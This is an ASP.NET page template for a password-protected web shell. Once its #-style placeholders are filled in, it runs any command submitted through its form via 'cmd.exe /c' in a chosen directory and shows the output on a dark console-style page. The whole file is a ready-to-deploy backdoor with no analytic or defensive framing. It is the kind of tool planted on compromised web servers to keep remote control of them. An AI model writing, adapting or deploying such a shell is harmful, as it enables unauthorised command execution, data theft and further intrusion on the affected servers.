<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string #P# = Request.Form["#PW#"];
    if (#P# != "#SECRET#") { return; }
    string #D# = Page.MapPath(".");
    if (!string.IsNullOrEmpty(Request.Form["#FD#"])) #D# = Request.Form["#FD#"];
    string #C# = Request.Form["#CMD#"];
    if (!string.IsNullOrEmpty(#C#)) {
        Process #PR# = new Process();
        #PR#.StartInfo.FileName = "cmd.exe";
        #PR#.StartInfo.Arguments = "/c " + #C#;
        #PR#.StartInfo.UseShellExecute = false;
        #PR#.StartInfo.RedirectStandardOutput = true;
        #PR#.StartInfo.WorkingDirectory = #D#;
        #PR#.Start();
        Response.Write("<pre>" + Server.HtmlEncode(#PR#.StandardOutput.ReadToEnd()) + "</pre>");
    }
}
</script>
<style>
    body { font-family: sans-serif; background: #1a1a1a; color: #00ff00; padding: 20px; }
    input { background: #333; color: #fff; border: 1px solid #555; padding: 5px; margin: 2px; }
    input[type="submit"] { background: #00ff00; color: #000; font-weight: bold; cursor: pointer; }
    pre { background: #000; padding: 10px; border: 1px solid #333; }
</style>
<form method="POST">
    <input type="password" name="#PW#" placeholder="Password">
    <input type="text" name="#FD#" placeholder="Working Directory">
    <input type="text" name="#CMD#" placeholder="Command">
    <input type="submit" value="Execute">
</form>
